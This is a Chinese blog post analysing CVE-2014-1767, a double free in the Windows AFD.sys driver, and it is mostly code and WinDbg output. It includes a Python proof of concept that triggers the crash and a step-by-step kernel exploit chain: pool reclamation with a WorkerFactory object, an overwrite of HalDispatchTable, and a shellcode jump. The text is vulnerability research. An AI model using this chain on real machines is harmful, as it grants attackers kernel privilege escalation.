---
layout: post
title:  "Windows AFD.sys 提权漏洞分析"
date:   2016-05-27 08:45:00
categories: Exploit
---

## 0x0 序
本篇文章深入分析一个AFD.sys中的double free漏洞，编号CVE-2014-1767。AFD.sys负责处理winsock网络通信时与硬件的交互，Pwn2Own 2014上曾经利用这个内核漏洞进行提权绕过IE沙箱，非常具有研究价值，最近exploit-db又提交了该漏洞的[EXP](https://www.exploit-db.com/exploits/39446/)，我们就参考它进行分析。

## 0x1 漏洞原因
先精简下EXP，构造一个POC让操作系统触发Bugcheck：

```
from ctypes import *
import socket, time, os, struct, sys
from ctypes.wintypes import HANDLE, DWORD

ntdll         = windll.ntdll
MEMRES        = (0x1000 | 0x2000)
PAGEEXE       = 0x00000040
Zerobits      = c_int(0)
RegionSize    = c_int(0x1000)
written       = c_int(0)
IoStatusBlock = c_ulong()

def CreateBuffer1():
    inbuf1size = 0x30
    virtualAddress = 0x18888888
    length = 0x20000
    
    inbuf1  = "\x00" * 0x18 + struct.pack("L", virtualAddress)
    inbuf1 += struct.pack("L", length)            #0x20
    inbuf1 += "\x00" * 0x8 + "\x01"   				
    inbuf1 += "\x00" * (inbuf1size - len(inbuf1))
    
    baseadd    = c_int(0x1001)
    dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                        byref(baseadd),
                                        0x0,
                                        byref(RegionSize),
                                        MEMRES,
                                        PAGEEXE)
    kernel32.WriteProcessMemory(-1, 0x1000, inbuf1, inbuf1size, byref(written))
    
def CreateBuffer2():
    inbuf2size = 0x10
    addrforbuf2 = 0x0AAAAAAA
    
    inbuf2 = "\x01\x00\x00\x00"
    inbuf2 += struct.pack("L", addrforbuf2)
    inbuf2 += "\x00" * (inbuf2size -len(inbuf2))
       
    baseadd    = c_int(0x2001)
    dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                        byref(baseadd),
                                        0x0,
                                        byref(RegionSize),
                                        MEMRES,
                                        PAGEEXE)   
    kernel32.WriteProcessMemory(-1, 0x2000, inbuf2, inbuf2size, byref(written))

#prepare parameters for afd!AfdTransmitFile
CreateBuffer1()

#prepare parameters for afd!AfdTransmitPackets
CreateBuffer2()

#call afd!AfdTransmitFile
ntdll.ZwDeviceIoControlFile(sock,None,None,None,byref(IoStatusBlock),0x1207f, inbuf1, 0x30, None, 0x0)

#call afd!AfdTransmitPackets
ntdll.ZwDeviceIoControlFile(sock,None,None,None,byref(IoStatusBlock),0x120c3, inbuf2, 0x10, None, 0x0)
```

执行后，直接BSOD，windbg打开转储文件，观察堆栈等信息：

```
kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

BAD_POOL_CALLER (c2)
The current thread is making a bad pool request.  Typically this is at a bad IRQL level or double freeing the same allocation, etc.
Arguments:
Arg1: 00000007, Attempt to free pool which was already freed
Arg2: 00001097, (reserved)
Arg3: 08150001, Memory contents of the pool block
Arg4: 86901ac0, Address of the block of pool being deallocated

Debugging Details:
------------------
POOL_ADDRESS:  86901ac0 Nonpaged pool
FREED_POOL_TAG:  Mdl 
BUGCHECK_STR:  0xc2_7_Mdl 
DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT
PROCESS_NAME:  python.exe
CURRENT_IRQL:  2
LAST_CONTROL_TRANSFER:  from 83f29083 to 83ec5110

STACK_TEXT:
8e6bc54c 83f29083 00000003 e244d844 00000065 nt!RtlpBreakWithStatusInstruction
8e6bc59c 83f29b81 00000003 86901ab8 000001ff nt!KiBugCheckDebugBreak+0x1c
8e6bc960 83f6bc6b 000000c2 00000007 00001097 nt!KeBugCheck2+0x68b
8e6bc9d8 83ed6ec2 86901ac0 00000000 870e88b8 nt!ExFreePoolWithTag+0x1b1
8e6bc9ec 899cceb0 86901ac0 00000000 899af89f nt!IoFreeMdl+0x70
8e6bca08 899af8ac 00000000 00000001 07f1986b afd!AfdReturnTpInfo+0xad
8e6bca44 899b0bba 07f198c3 000120c3 899b0a8c afd!AfdTliGetTpInfo+0x89
8e6bcaec 899b52bc 8691c038 870f0190 8e6bcb14 afd!AfdTransmitPackets+0x12e
8e6bcafc 83e81593 870f0190 869040d0 869040d0 afd!AfdDispatchDeviceControl+0x3b
8e6bcb14 8407599f 8691c038 869040d0 869041ac nt!IofCallDriver+0x63
8e6bcb34 84078b71 870f0190 8691c038 00000000 nt!IopSynchronousServiceTail+0x1f8
8e6bcbd0 840bf3f4 870f0190 869040d0 00000000 nt!IopXxxControlFile+0x6aa
8e6bcc04 83e881ea 00000168 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
8e6bcc04 772a70b4 00000168 00000000 00000000 nt!KiFastCallEntry+0x12a
0021f964 772a5864 1d1addda 00000168 00000000 ntdll!KiFastSystemCallRet
0021f968 1d1addda 00000168 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc
WARNING: Stack unwind information not available. Following frames may be wrong.
0021f99c 1d1acae6 1d1ac930 0021f9bc 00000028 _ctypes!DllCanUnloadNow+0x5b7a
0021f9cc 1d1a8de8 772a5858 0021fb00 5a716456 _ctypes!DllCanUnloadNow+0x4886
0021fa7c 1d1a95ce 00001100 772a5858 0021fad0 _ctypes!DllCanUnloadNow+0xb88
0021fbf0 1d1a54d8 772a5858 01adce40 00000000 _ctypes!DllCanUnloadNow+0x136e
0021fc48 1e07cdec 00000000 01adce40 00000000 _ctypes+0x54d8
00000000 00000000 00000000 00000000 00000000 python27!PyObject_Call+0x4c

STACK_COMMAND:  kb
FOLLOWUP_IP: 
afd!AfdReturnTpInfo+ad
899cceb0 ff45fc          inc     dword ptr [ebp-4]

SYMBOL_STACK_INDEX:  5
SYMBOL_NAME:  afd!AfdReturnTpInfo+ad
FOLLOWUP_NAME:  MachineOwner
MODULE_NAME: afd
IMAGE_NAME:  afd.sys
DEBUG_FLR_IMAGE_TIMESTAMP:  4ce78960
FAILURE_BUCKET_ID:  0xc2_7_Mdl__afd!AfdReturnTpInfo+ad
BUCKET_ID:  0xc2_7_Mdl__afd!AfdReturnTpInfo+ad
Followup: MachineOwner
---------
```

IOCTLs 0x1207f映射内核afd!AfdTransmitFile函数，0x120c3映射内核afd!AfdTransmitPackets。Bugcheck也告诉我们崩溃原因是'double freeing the same allocation'，从堆栈看Bugcheck触发路径，当POC第二次调用ZwDeviceIoControlFile(0x120c3)，内核依次调用了afd!AfdTransmitPackets->afd!AfdTliGetTpInfo->afd!AfdReturnTpInfo->nt!IoFreeMdl->nt!ExFreePoolWithTag->nt!KeBugCheck2，猜测是多次释放了某个MDL对象，导致了double free。那么要想搞清楚具体过程还需要知道路径上几个关键函数的作用：

- afd!AfdTransmitFile
- afd!AfdTransmitPackets
- afd!AfdTliGetTpInfo
- afd!AfdReturnTpInfo

首先先从代码较少的afd!AfdTliGetTpInfo和afd!AfdReturnTpInfo开始逆向分析，直接贴出afd!AfdTliGetTpInfo伪代码：

```
PVOID AfdTliGetTpInfo(int elementCount)
{
    PVOID result;

    //得到一个TpInfo结构
    result = afd!ExAllocateFromNPagedLookasideList(&_AfdGlobalData[6].ContentionCount);
    
    if(result)
    {
        //对TpInfo进行初始化的一些操作
        //...
        
        //路径：afd!AfdTransmitFile->afd!AfdTliGetTpInfo(3)
        //所以第一次python调用IOCTLs时，下面分支不触发，但是第二次触发，先记着这里
        if(elementCount > AfdDefaultTpInfoElementCount) //AfdDefaultTpInfoElementCount == 3
        {
            POOL_TYPE type = 0x10;
            int       sizeOfTpInfoElement = 0x18;
            int       flag = 0xC66466641;
            
            //申请一定数量的TpInfoElement，并存入offset_0x20
            result->offset_0x20 = nt!ExAllocatePoolWithQuotaTag(type, sizeOfTpInfoElement * elementCount, flag);
            
            //offset_0x32是一个和AfdReturnTpInfo相关的属性
            result->offset_0x32 = 1;
        }
    }
    
    return result;
}
```

可以看到这里出现了两个数据结构，TpInfo和TpInfoElement，稍后在逆向关键函数过程中可以推导出相应数据结构，现在来看看afd!ExAllocateFromNPagedLookasideList内部发生了什么，伪代码：

```
PVOID ExAllocateFromNPagedLookasideList(PNPAGED_LOOKASIDE_LIST lookaside)
{
    PVOID result;

    //尝试从lookaside list取出一个TpInfo结构
    result = nt!InterlockedPopEntrySList(lookaside->listHead);

    //如果失败
    if(!result)
    {
         //申请一个TpInfo结构，并负责初始化
         //调试发现TpInfo结构大小为0x108字节
         afd!AfdAllocateTpInfo(lookaside->type, lookaside->size, lookaside->tag);
    }
}

//申请TpInfo并初始化
PVOID AfdAllocateTpInfo(POOL_TYPE type, SIZE_T size, ULONG tag)
{
    PVOID result;
    
    result = nt!ExAllocatePoolWithTagPriority(type, size, tag, 0);
    
    if(result)
    {
        //初始化，AfdDefaultTpInfoElementCount = 3，AfdTdiStackSize = 3
        afd!AfdInitializeTpInfo(result, AfdDefaultTpInfoElementCount, AfdTdiStackSize, 1);
    }
    
    return result;
}

void AfdInitializeTpInfo(void *pTpInfo, int elementCount, int stackSize, bool xx)
{
    //初始化前0x90字节
    //同时，这里pTpInfo->offset_0x32 = 0
    memset(pTpInfo, 0, 0x90);
    
    //指向pTpInfo自身偏移0x90的地址
    pTpInfo->offset_0x20 = (char *)(pTpInfo) + 0x90;
    
    //其它操作
    //...
}
```

afd!AfdTliGetTpInfo内部依次调用了一些其它函数，稍后再总结。
接下来再了解下更简单的afd!AfdReturnTpInfo，伪代码：

```
void AfdReturnTpInfo(PVOID pTpInfo, bool someBoolean)
{
    //其它
    //...

    //从这里可以判断出offset_0x28代表TpInfoElement结构的个数
    for(int i = 0;i < pTpInfo->offset_0x28;++i)
    {
        //这里可以判断出offset_0x20表示TpInfoElement数组
        PVOID element = &(pTpInfo->offset_0x20[i])
        
        //offset_0x0类似flag
        if(element->offset_0x0 & 2)
        {
            //其它
            //...
        }
        else
        {
            //offset_0xC指向mdl buffer
            PVOID mdl = element->offset_0xC;

            if(mdl)
            {
                //解除锁定
                nt!MmUnlockPages(mdl);
 
                //释放mdl，第二次释放时，BSOD
                nt!IoFreeMdl(mdl);
            }
        }
    }
    
    //还记得在AfdTliGetTpInfo中，当elementCount大于3的时候
    //调用ExAllocatePoolWithQuotaTag创建TpInfoElement数组，将地址赋值给offset_0x20，offset_0x32=1
    //然而AfdInitializeTpInfo中，offset_0x32=0，并且offset_0x20指向自身pTpInfo->offset_0x90
    //所以这里推测出offset_0x32 == 0，表示TpInfoElement数组所在地址是指向自身，否则是创建出来的
    if(pTpInfo->offset_0x32)
    {
        //释放创建出来的数组内存
        ExFreePoolWithTag(pTpInfo->offset_0x20, 0xc6646641);
        
        pTpInfo->offset_0x20 = (char *)(pTpInfo) + 0x90;
        pTpInfo->offset_0x32 = 0;
    }

    //someBoolean == 1
    if(someBoolean)
    {
        //将pTpInfo重新放入lookaside
        ExFreeToNPagedLookasideList(lookaside, pTpInfo);
    }
    else
    {
        AfdFreeTpInfo(pTpInfo);
    }
}
```

还差2个函数就可以把漏洞原因清晰的描绘出来，继续分析afd!AfdTransmitFile函数：

```
int AfdTransmitFile(PVOID irp, PVOID stack)
{
    //参数stack是进程在用户态的堆栈，内核通过它来获取到传入的参数，下面用stack代表输入参数
    //struct stack
    //{
    //    int var_1 ~ var_6 = 0x0;
    //    int address = 0x18888888;
    //    int length = 0x20000;
    //    int var_9 ~ var_10 = 0x0;
    //    int var_11 = 0x1;           绕过一判断时使用
    //}
    
    //一系列判断操作
    //EXP通过构造的stack绕过判断，直到调用AfdTliGetTpInfo(3)
    //...
    
    //获取一个TpInfo结构
    PVOID tpInfo = AfdTliGetTpInfo(3);
    
    if(tpInfo)
    {
        //之前分析过，offset_0x28代表TpInfoElement结构个数
        tpInfo->offset_0x28 = 0;
        
        if(stack->length > 0)
        {
            //offset_0x20存放element数组地址
            PVOID element = tpInfo->offset_0x20;
            
            //offset_0x28 = elementCount
            tpInfo->offset_0x28 += 1;
        
            //mdl描述的地址
            element->offset_0x8 = stack->address;
        
            //mdl描述的长度
            element->offset_0x4 = stack->length;
        
            //类似flag
            element->offset_0x0 = 1;
            
            //在这里简单说下MDL是个什么东西，MDL提供了一种机制使得一段虚拟地址与一段物理地址绑定起来
            //虚拟内存对应空间有时候不在物理内存当中，有可能被交换到硬盘上
            //通过MDL绑定后这片内存就被锁定，只存在于物理内存
            //下面函数只是分配一个MDL结构，绑定操作需要MmProbeAndLockPages函数进行
            //而且MDL结构是变长的，需要通过传入参数进行计算，计算公式：
            //size = ((length + 0xfff + (address & 0xfff)) >> 0x0c) * 8 + 0x30
            //按提供的地址、长度申请MDL，也就是说MDL结构大小我们可控，并存放到element->offset_0xC 
            element->offset_0xC = nt!IoAllocateMdl(element->offset_0x8, element->offset_0x4, 0, 1, 0);

            if(element->offset_0xC) 
            { 
                //尝试锁定MDL描述的页，这个函数在MSDN中返回值是VOID
                //如果失败则抛出异常
                MmProbeAndLockPages(element->offset_0xC, AccessMode, Operation); 
            }
        }
    }
}
```

OK，现在整理一下思路：
POC第一次IOCTLs调用，内核调用afd!AfdTransmitFile，同时传递了一些自己构造的参数。afd!AfdTransmitFile->AfdTliGetTpInfo(3)->ExAllocateFromNPagedLookasideList()，尝试从lookaside list POP出一个TpInfo结构。如果不成功的话（通常情况下不会成功，因为lookaside list只属于afd模块使用，而且afd!AfdTliGetTpInfo在现在操作系统上很少调用，至少调试时候没有遇到）则调用afd!AfdAllocateTpInfo从内存分配，然后调用afd!AfdInitializeTpInfo进行初始化。初始化时，会将TpInfo->offset_0x20指向TpInfo->offset_0x90的地址，然后设置TpInfo->offset_0x32为0，函数返回到afd!AfdTransmitFile继续执行，接着初始化一个TpInfoElement结构，并以构造的参数创建一个MDL，再调用MmProbeAndLockPages锁定MDL描述的内存地址0x18888888，因为0x18888888是一个无效的地址，函数抛出异常，进入exception handler。

```
kd> dd 18888888
18888888  ???????? ???????? ???????? ????????
18888898  ???????? ???????? ???????? ????????
188888a8  ???????? ???????? ???????? ????????
188888b8  ???????? ???????? ???????? ????????
188888c8  ???????? ???????? ???????? ????????
188888d8  ???????? ???????? ???????? ????????
188888e8  ???????? ???????? ???????? ????????
188888f8  ???????? ???????? ???????? ????????
kd> 
eax=86962f60 ebx=880d2258 ecx=00000001 edx=00000000 esi=880a7ca0 edi=880a7c10
eip=8999149d esp=970a7a3c ebp=970a7aec iopl=0         nv up ei ng nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000286
afd!AfdTransmitFile+0x17f:
8999149d ff1578429889    call    dword ptr [afd!_imp__MmProbeAndLockPages (89984278)] ds:0023:89984278={nt!MmProbeAndLockPages (83e789df)}
kd> bu 89991840
kd> bl
 0 e 89990823     0001 (0001) afd!AfdTliGetTpInfo
 1 e 89991840     0001 (0001) afd!AfdTransmitFile+0x522
13 e 8999131e     0001 (0001) afd!AfdTransmitFile
15 e 89991a8c     0001 (0001) afd!AfdTransmitPackets
16 d 83e4e0c0     0001 (0001) nt!KiFastCallEntry
kd> p;r
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=89991840 edi=00000000
eip=89991840 esp=970a7548 ebp=970a7aec iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
afd!AfdTransmitFile+0x522:
89991840 8b65e8          mov     esp,dword ptr [ebp-18h] ss:0010:970a7ad4=970a7a48
```

![图片2](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片2.png)
![图片3](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片3.png)

Handler里面调用了afd!AfdReturnTpInfo，前面提到过，afd!AfdReturnTpInfo会遍历TpInfo结构中的TpInfoElement数组，逐个释放其中的MDL。在我们的情况下，因为数组是保存在TpInfo结构中，所以数组不需要释放，最后把TpInfo结构push回lookaside。但是，这里并没有清空TpInfo->offset_0x20，TpInfo->offset_0x20仍然指向TpInfoElement数组，TpInfoElement中的MDL已经无效，因此成为了一个Dangling Pointer。假设后面的内核函数再次调用到afd!AfdTliGetTpInfo，那么会从lookaside里面pop出TpInfo结构，注意，lookaside list是一种LIFO结构，也就是说，这次得到的TpInfo就是上一次释放回去的TpInfo！
接下来的任务就是创造一种环境，使得afd!AfdTliGetTpInfo和afd!AfdReturnTpInfo分别调用一次就可以出现double free。
回过头来看看BSOD的堆栈：

```
8e6bca08 899af8ac 00000000 00000001 07f1986b afd!AfdReturnTpInfo+0xad
8e6bca44 899b0bba 07f198c3 000120c3 899b0a8c afd!AfdTliGetTpInfo+0x89
8e6bcaec 899b52bc 8691c038 870f0190 8e6bcb14 afd!AfdTransmitPackets+0x12e
```

POC中的第二个IOCTLs调用了内核函数afd!AfdTransmitPackets，来简单分析下该函数，伪代码：

```
int AfdTransmitPackets(PVOID irp, PVOID stack)
{
    //其他操作
    //....
    
    //参数stack是进程在用户态的堆栈，内核通过它来获取到传入的参数，下面用stack代表输入参数
    //struct stack
    //{
    //    int var_1 = 0x1;
    //    int elementCount = 0xaaaaaaa;
    //    int var_3 = 0x0;
    //    int var_4 = 0x0;
    //}
    
    if((stack->var_4 & 0xFFFFFFC8) == 0)
    {
        if((stack->var_4 & 0x30) != 0x30)
        {
            //EXP构造了允许的最大值，原因后面解释
            if(stack->elementCount && stack->elementCount <= 0xaaaaaaa)
            {
                //将可控数据传入
                afd!AfdTliGetTpInfo(0xaaaaaaa);
            }
        }
    }
}
```

回顾afd!AfdTliGetTpInfo函数，首先从lookaside list POP出之前的TpInfo，此时还没问题。接着因为0xaaaaaaa远大于AfdDefaultTpInfoElementCount(等于3)，则执行ExAllocatePoolWithQuotaTag(type, 0x18 * 0xaaaaaaa, flag)，在32位操作系统上申请这么大的内存必然失败，触发异常处理，异常处理又调用了afd!AfdReturnTpInfo，触发了double free！
![图片1](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片1.png)

## 0x2 漏洞利用
通常对Double Free的利用都会转换成Use-After-Free，那么这个漏洞也不例外，来看看EXP中的利用过程吧：

1. 调用afd!AfdTransmitFile创造一个Dangling Pointer，而且被释放的MDL大小我们可控
2. 创造一个与MDL大小相同的对象unlucky_obj，占用这片内存，给这个内存地址命名victim_address
3. 调用afd!AfdTransmitPackets再次释放unlucky_obj，从这步开始变成UAF
4. 用可控的数据覆盖victim_address
5. 因为本身unlucky_obj数据被改写，调用unlucky_obj的某个方法获得内存写的机会
6. 重写nt!HalDispatchtable某个unlucky_kernel_func的指针为shellcode
7. 用户态调用内核函数unlucky_kernel_func，内核执行shellcode，提权

清楚了漏洞利用原理，下面通过动态调试来看看这几个步骤的发生：
### Step 1
创建MDL，构造的大小0xa0:

```
kd> 
eax=000000a0 ebx=00000001 ecx=00000888 edx=00000000 esi=880a7ca0 edi=18888888
eip=83ea559f esp=9f52da08 ebp=9f52da2c iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
nt!IoAllocateMdl+0xaa:
83ea559f e861ba0800      call    nt!ExAllocatePoolWithTag (83f31005)
kd> dds esp
9f52da08  00000000
9f52da0c  000000a0
9f52da10  206c644d
kd>                                   //记住MDL地址
eax=87f80060 ebx=00000001 ecx=00042238 edx=00000ac3 esi=880a7ca0 edi=18888888
eip=83ea55a4 esp=9f52da14 ebp=9f52da2c iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!IoAllocateMdl+0xaf:
83ea55a4 85c0            test    eax,eax
```

### Step 2
EXP中这个unlucky_obj对象选择了WorkerFactory，之所以这样做是因为unlucky_obj必须具有写内存的能力，也就是对象具有NtSet*这样的函数，而且如果想要在任意地址写数据，该函数需要有形如下面的指令：

```
mov ecx, [ebp + object]    //获得unlucky_obj指针
mov edx, [ebp + data]      //获得参数

mov eax, [ecx + 0x10]      //在偏移0x10取得一个可控的用户态地址
mov ebx, [eax + 0x20]      //从用户态地址偏移0x20获得目标地址
mov [ebx + 0x30], edx      //任意地址写任意数据
```

看来WorkerFactory符合上述条件，ntdll!ZwCreateWorkerFactory在内核中会调用nt!NtCreateWorkerFactory，随后调用

![图片4](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片4.png)

看雪上有一篇专门介绍[ObCreateObject](http://www.pediy.com/kssd/pediy11/114730/820460/44304.pdf)的文章，个人觉得写的不错，毕竟是内核频繁使用的函数，收藏起来回头深入研究。进入ObCreateObject，来到了nt!ObpAllocateObject：

```
kd> kb
ChildEBP RetAddr  Args to Child              
9f52db60 84036329 0021f901 9f52db88 00000078 nt!ObpAllocateObject+0xdd
9f52db94 8402207b 0021f901 865f3730 00000000 nt!ObCreateObject+0x128
9f52dc04 83e4e1ea 01b16af8 10000000 00000000 nt!NtCreateWorkerFactory+0x142
9f52dc04 777e70b4 01b16af8 10000000 00000000 nt!KiFastCallEntry+0x12a
kd> r;dds esp
eax=ef577054 ebx=00000000 ecx=000000a0 edx=00000000 esi=865f3730 edi=87f73860
eip=840364ba esp=9f52db3c ebp=9f52db60 iopl=0         nv up ei ng nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000282
nt!ObpAllocateObject+0xdd:
840364ba e846abefff      call    nt!ExAllocatePoolWithTag (83f31005)
9f52db3c  00000000
9f52db40  000000a0            //和MDL一样大小
9f52db44  ef577054
kd> p                      //返回和之前MDL一样的地址
eax=87f80060 ebx=00000000 ecx=00003678 edx=00000086 esi=865f3730 edi=87f73860
eip=840364bf esp=9f52db48 ebp=9f52db60 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!ObpAllocateObject+0xe2:
840364bf 33d2            xor     edx,edx
kd> dd eax
87f80060  00000000 000000a0 00000000 00760065
87f80070  18888000 00020000 00000888 ffffffff
87f80080  00690064 006b0073 006f0056 0075006c
87f80090  0065006d 005c0031 00720050 0067006f
87f800a0  00610072 0020006d 00690046 0065006c
87f800b0  005c0073 0061004a 00610076 006a005c
87f800c0  00650072 002e0031 002e0038 005f0030
87f800d0  00360036 0062005c 006e0069 006a005c
```

可以看到ntdll!ZwCreateWorkerFactory重新占用了MDL的地址
### Step 3
这一步之前分析过原因，从调试数据看跳到了Exception Handler

```
kd>
eax=880a7c24 ebx=8717d348 ecx=00000000 edx=00000001 esi=880a7c10 edi=fffffff0
eip=8999088c esp=9365ba0c ebp=9365ba44 iopl=0         ov up ei ng nz na pe cy
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000a87
afd!AfdTliGetTpInfo+0x69:
8999088c ff151c429889    call    dword ptr [afd!_imp__ExAllocatePoolWithQuotaTag (8998421c)] ds:0023:8998421c={nt!ExAllocatePoolWithQuotaTag (83eb7b9f)}
kd> dds esp
9365ba0c  00000010
9365ba10  fffffff0     //0xaaaaaaa * 0x18
9365ba14  c6646641
kd> bp 8999089f        //Exception Handler
kd> p
Breakpoint 7 hit   
afd!AfdTliGetTpInfo+0x7c:
8999089f 8b65e8          mov     esp,dword ptr [ebp-18h]    
kd> u 8999089f 
afd!AfdTliGetTpInfo+0x7c:
8999089f 8b65e8          mov     esp,dword ptr [ebp-18h]
899908a2 6a01            push    1
899908a4 ff75e4          push    dword ptr [ebp-1Ch]
899908a7 e857d50100      call    afd!AfdReturnTpInfo (899ade03)
```

### Step 4
现在我们有了一个合适的UAF对象，并且已经free掉了，接下来的任务是用可控数据重写这块victim_address，EXP中使用了[ntdll.ZwQueryEaFile](https://msdn.microsoft.com/en-us/library/windows/hardware/ff961907(v=vs.85).aspx)函数做这项工作，

![图片5](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片5.png)

该函数第6个和第7个参数分别表示EaList(源地址)和EaListLength(MDL大小)，首先按EaListLength申请一片内存，返回victim_address，然后将EaList指向内存拷贝到victim_address，完成数据覆盖
这里有一个小问题，EXP中的EaListLength大小等于MDL(0xa0)-4，也就是0x9C，后来分析了一下ExAllocatePoolWithQuotaTag函数，发现内部做了EaListLength += 4，再去调用ExAllocatePoolWithTag，最后申请大小还是0xa0

![图片6](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片6.png)

```
kd> 
eax=87f80060 ebx=01ba4b98 ecx=8688ed40 edx=20206f49 esi=0000009c edi=00000000
eip=83fa3c15 esp=9f481b90 ebp=9f481c08 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206
nt!NtQueryEaFile+0xca:
83fa3c15 e8a65beaff      call    nt!memcpy (83e497c0)
kd> dds esp
9f481b90  87f80060
9f481b94  00002100
9f481b98  0000009c
kd> dd 0x2100                             //触发UAF前，申请的这片内存
00002100  00000000 000000a8 00000000 00000000
00002110  00000001 00000001 00000000 00080016
00002120  00000000 00000000 00002200 41414141
00002130  41414141 41414141 41414141 41414141
00002140  41414141 41414141 41414141 41414141
00002150  41414141 41414141 41414141 41414141
00002160  41414141 41414141 41414141 41414141
00002170  41414141 41414141 41414141 41414141
```

### Step.5 and 6
下面该unlucky_obj(WorkerFactory)登场了，Step 4已经把WorkerFactory对象空间内容改写，接下来调用ntdll!ZwSetInformationWorkerFactory来执行任意地址写任意数据，ZwSetInformationWorkerFactory中根据handle取出object后：

![图片7](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片7.png)

看下面任意地址写的过程：

```
kd> r
eax=00000000 ebx=00000008 ecx=8a284080 edx=00000001 esi=00000008 edi=00020704
eip=83ebe4bc esp=8e7f5bc4 ebp=8e7f5c1c iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!NtSetInformationWorkerFactory+0x159://获得unlucky对象+0x28偏移地址
83ebe4bc 8b45e4          mov     eax,dword ptr [ebp-1Ch] ss:0010:8e7f5c00=87f80088
kd> p;r
eax=87f80088 ebx=00000008 ecx=8a284080 edx=00000001 esi=00000008 edi=00020704
eip=83ebe4bf esp=8e7f5bc4 ebp=8e7f5c1c iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!NtSetInformationWorkerFactory+0x15c://获得用户空间的地址0x2200
83ebe4bf 8b00            mov     eax,dword ptr [eax]  ds:0023:87f80088=00002200
kd> dd 87f80060 
87f80060  88101ec0 000000a8 00000000 00000000
87f80070  00000002 00000001 00000000 00080016
87f80080  00000000 00000000 00002200 41414141
87f80090  41414141 41414141 41414141 41414141
87f800a0  41414141 41414141 41414141 41414141
87f800b0  41414141 41414141 41414141 41414141
87f800c0  41414141 41414141 41414141 41414141
87f800d0  41414141 41414141 41414141 41414141
kd> p;r
eax=00002200 ebx=00000008 ecx=8a284080 edx=00000001 esi=00000008 edi=00020704
eip=83ebe4c1 esp=8e7f5bc4 ebp=8e7f5c1c iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
nt!NtSetInformationWorkerFactory+0x15e://获得nt!HalDispatchTable偏移
83ebe4c1 8b4010          mov     eax,dword ptr [eax+10h] ds:0023:00002210=83f3b3e0
kd> dd eax
00002200  00000000 00000000 00000000 00000000
00002210  83f3b3e0 00000000 00000000 00000000
00002220  00000000 00000000 00000000 00000000
00002230  00000000 00000000 00000000 00000000
00002240  00000000 00000000 00000000 00000000
00002250  00000000 00000000 00000000 00000000
00002260  00000000 00000000 00000000 00000000
00002270  00000000 00000000 00000000 00000000
kd> 
eax=83f3b3e0 ebx=00000008 ecx=8a284080 edx=00000001 esi=00000008 edi=00020704
eip=83ebe4ce esp=8e7f5bc4 ebp=8e7f5c1c iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
nt!NtSetInformationWorkerFactory+0x16b://任意地址写任意数据
83ebe4ce 89781c          mov     dword ptr [eax+1Ch],edi ds:0023:83f3b3fc={hal!HaliQuerySystemInformation (842498a2)}
kd> dds eax+0x18
83f3b3f8  00000004
83f3b3fc  842498a2 hal!HaliQuerySystemInformation //unlucky_kernel_func
83f3b400  8424a1b4 hal!HalpSetSystemInformation
83f3b404  840c4637 nt!xHalQueryBusSlots
kd> p;r
eax=83f3b3e0 ebx=00000008 ecx=8a284080 edx=00000001 esi=00000008 edi=00020704
eip=83ebe4d1 esp=8e7f5bc4 ebp=8e7f5c1c iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
nt!NtSetInformationWorkerFactory+0x16e:
83ebe4d1 8b4de4          mov     ecx,dword ptr [ebp-1Ch] ss:0010:8e7f5c00=868536a8
kd> dds nt!HalDispatchTable
83f3b3f8  00000004
83f3b3fc  00020704
83f3b400  8424a1b4 hal!HalpSetSystemInformation
83f3b404  840c4637 nt!xHalQueryBusSlots
```

成功覆盖nt!HalDispatchTable第一个函数指针hal!HaliQuerySystemInformation
### Step.7
接下来只需要在用户态调用hal!HaliQuerySystemInformation就可以改变内核流程，转向shellcode了

```
kd> 
eax=8e7f5be0 ebx=8411ce01 ecx=01af4c38 edx=8411ce6b esi=01af4c38 edi=00001337
eip=840db438 esp=8e7f5bd0 ebp=8e7f5bf0 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206
nt!KeQueryIntervalProfile+0x23:
840db438 ff15fcb3f383    call    dword ptr [nt!HalDispatchTable+0x4 (83f3b3fc)] ds:0023:83f3b3fc=00020704//已被改写成shell地址
kd> t
Breakpoint 19 hit
00020704 90              nop
kd> p;r
eax=8e7f5be0 ebx=8411ce01 ecx=01af4c38 edx=8411ce6b esi=01af4c38 edi=00001337
